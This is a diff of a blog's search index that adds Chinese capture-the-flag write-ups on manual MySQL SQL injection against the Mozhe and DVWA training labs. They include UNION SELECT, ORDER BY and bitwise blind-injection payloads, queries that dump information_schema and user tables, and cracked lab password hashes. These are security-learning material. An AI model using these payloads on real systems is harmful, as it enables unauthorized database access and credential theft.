@@ -1,6 +1,19 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[墨者-SQL手工注入漏洞测试(MySQL数据库)]]></title>
+    <url>%2F2019%2F07%2F29%2F%E5%A2%A8%E8%80%85-SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95-MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%2F</url>
+    <content type="text"><![CDATA[Background 安全工程师”墨者”最近在练习SQL手工注入漏洞，自己刚搭建好一个靶场环境Nginx+PHP+MySQL，PHP代码对客户端提交的参数未做任何过滤。尽情的练习SQL手工注入吧。 检测SQL注入点发现一个维护公告链接 基于报错的检测先在链接后的id=1加入 ‘，查看页面反应发现页面没有任何显示，可能存在SQL注入 基于布尔值判断12http://mozhe.cn/new_list.php?id=1 and 1=1 正常显示http://mozhe.cn/new_list.php?id=1 and 1=2 不正常显示 那么可以判段存在SQL注入 判断select字段个数12http://mozhe.cn/new_list.php?id=1 order by 4http://mozhe.cn/new_list.php?id=1 order by 5 当order by语句中数值大于4，页面不显示，说明select语句中有4个字段 查询数据库信息先判断页面中会显示的字段位置 1http://mozhe.cn/new_list.php?id=1 and 1=2 union select 1,2,3,4 判断出2，3字段的位置会在页面显示，因此可以开始构造sql语句了 查询数据库名，版本 1http://mozhe.cn/new_list.php?id=1 and 1=2 union select 1,database(),version(),4 数据库名：mozhe_Discuz_StormGroup版本： 5.7.22-0ubuntu0.16.04.1 这里也可以用CONCAT_WS函数 1http://mozhe.cn/new_list.php?id=1 and 1=2 union select 1,2,CONCAT_WS(CHAR(32,58,32),user(),database(),version()),4 获取数据库名1http://mozhe.cn/new_list.php?id=1 and 1=2 union select 1,2 ,table_schema,4 from information_schema.tables limit 1,1 通过修改limit值获得所有数据库名称获得5个数据库名称information_schema、 mozhe_Discuz_StormGroup、 mysql、 performance_schmozhe.cn 1http://mozhe.cn/new_list.php?id=1 and 1=2 union select 1,2 ,table_name,4 from information_schema.tables where table_schema=&apos;mozhe_Discuz_StormGroup&apos; limit 0,1 mozhe_Discuz_StormGroup库的表名：StormGroup_member、 notice 获取数据库列名1http://mozhe.cn/new_list.php?id=1 and 1=2 union select 1,2 ,column_name,4 from information_schema.columns where table_schema=&apos;mozhe_Discuz_StormGroup&apos; and table_name=&apos;StormGroup_member&apos; limit 0,1 StormGroup_member表的列名： id、 name、 password、 status 获取字段内容（账号密码）1http://mozhe.cn/new_list.php?id=1 and 1=2 union select 1,name,password,4 from mozhe_Discuz_StormGroup.StormGroup_member limit 0,1 账号密码（MD5在线破解）mozhe 356f589a7df439f6f744ff19bb8092c0 —-dsan13mozhe c0b11cc529cd469efe3c3333e2bcc3db —-346753 登陆后台获取key]]></content>
+      <categories>
+        <category>靶场实战</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>SQL注入</tag>
+        <tag>Web安全</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[手动挖掘漏洞-SQL盲注（四）]]></title>
     <url>%2F2019%2F07%2F27%2F%E6%89%8B%E5%8A%A8%E6%8C%96%E6%8E%98%E6%BC%8F%E6%B4%9E-SQL%E7%9B%B2%E6%B3%A8%EF%BC%88%E5%9B%9B%EF%BC%89%2F</url>
     <content type="text"><![CDATA[SQL盲注 SQL盲注：不显示数据库内建的报错信息【内建的报错信息帮助开发人员发现和修复问题】，但由于报错信息中提供了关于系统的大量有用信息。当程序员隐藏了数据库内建报错信息，替换为通用的错误提示，SQL注入将无法依据报错信息判断注入语句的执行结果，即为盲注。 思路:既然无法基于报错信息判断结果，那就基于逻辑真假的不同结果来判断 SQL注入判断基本的布尔值判断 121&apos; and 1=1 -- // True 有回显 或 显示正常1&apos; and 1=2 -- // False 无回显 或 报错 当布尔值为真，有显示内容，布尔值为假，无回显基于这样判断，很可能存在SQL注入漏洞 推测select字段数121&apos; order by 2 -- // 判断select语句中的列字段个数1&apos; order by 3 -- 当order by 后的num 大于select中的字段数，无回显如上当num值为2时，还有回显，num大于2时，无回显，说明select语句中查询的字段数为2个因此后续就可以利用union select语句查询想要的信息 查询数据库11' union select null, CONCAT_WS(CHAR(32,58,32), user(), database(), version()) -- // 查询mysql用户，数据库名，数据库版本 11' union select null, table_name from information_schema.tables -- // 查询元数据库中的所有表名 11' and 1=0 union select null,table_name from information_schema.columns where table_name='users' # // 查询是否有users这张表 猜解数据库12' or user='admin 12' or user like '%a% 猜账号密码12' or user='admin' and password='5f4dcc3b5aa765d61d8327deb882cf99 【BurpSuite自动化】 另类猜解当遇到网页不显示任何从数据库中提取的信息，只有页面风格画面的转换 12and 1=1 -- 显示 页面1and 1=2 -- 显示 页面2 此时，常见注入工具可能无法发现漏洞可以尝试构造语句，手工注入或编写脚本 11' and ORD(MID((version()),1,1))&amp;128&gt;0 -- 函数： ORD() ：把函数中的字符转换成ASCII码 MID(ColumnName, Start [, Length]) ：截取字符串 ORD(string)&amp;128 ：将转换的ASCII数值于128(二进制：10000000)进行与运算； 如果运算结果大于0，说明第一位数值为1（从左往右） 如果运算结果等于0，说明第一位数值为0 依次计算（1，2，4，8，16，32，64，128）,判断每一位的二进制数值 然后将计算到的二进制值转成十进制，反向计算出ASCII值【注】：键盘可输入的ASCII值只有128位 通过判断有无回显，间接猜出想要的信息以下以判断数据库名为例通过以上的回显进行判断,有回显置1 1231' and ORD(MID((database()),1,1))&amp;128&gt;0 -- 128 64 32 16 8 4 2 1b 0 1 1 0 0 1 0 0 计算出ASCII值为100，即字符 ‘d’后面字符的猜解，只需修改截取的位置 11' and ORD(MID((database()),2,1))&amp;128&gt;0 -- 通过多次猜解，就可以得到数据库名 ‘dvwa’； 12345671' and ORD(MID((database()),n,1))&amp;128&gt;0 -- n 128 64 32 16 8 4 2 1 ascii(DEC)1 0 1 1 0 0 1 0 0 -----100--------d2 0 1 1 1 0 1 1 0 -----118--------v3 0 1 1 1 0 1 1 1 -----100--------w4 0 1 1 0 0 0 0 1 ------97--------a]]></content>
@@ -36,6 +49,7 @@
       <tags>
         <tag>CTF</tag>
         <tag>SQL注入</tag>
+        <tag>Web安全</tag>
       </tags>
   </entry>
   <entry>
